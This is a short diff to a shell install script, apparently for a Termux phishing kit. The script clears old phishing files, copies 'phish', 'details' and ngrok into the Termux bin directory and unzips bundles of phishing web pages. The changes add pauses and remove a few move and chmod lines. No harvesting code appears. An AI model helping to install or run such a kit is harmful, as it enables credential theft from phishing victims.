@@ -6,6 +6,7 @@ rm -rf ngrok
 rm -rf phish
 rm -rf details
 echo "removing all old phishing files"
+sleep 10
 cd 
 cd Phishing
 cp -r details /data/data/com.termux/files/usr/bin
@@ -15,9 +16,6 @@ chmod 775 phish
 chmod 775 details
 cd
 cd Phishing
-mv ngrok $HOME
-cd
-chmod +x *
 cp -r ngrok /data/data/com.termux/files/usr/bin
 cd /data/data/com.termux/files/usr/bin
 chmod 775 ngrok
@@ -25,6 +23,7 @@ cd
 
 cd Phishing
 echo "installing files"
+sleep 10
 mkdir WebPages
 unzip WebPages1.zip
 unzip WebPages2.zip
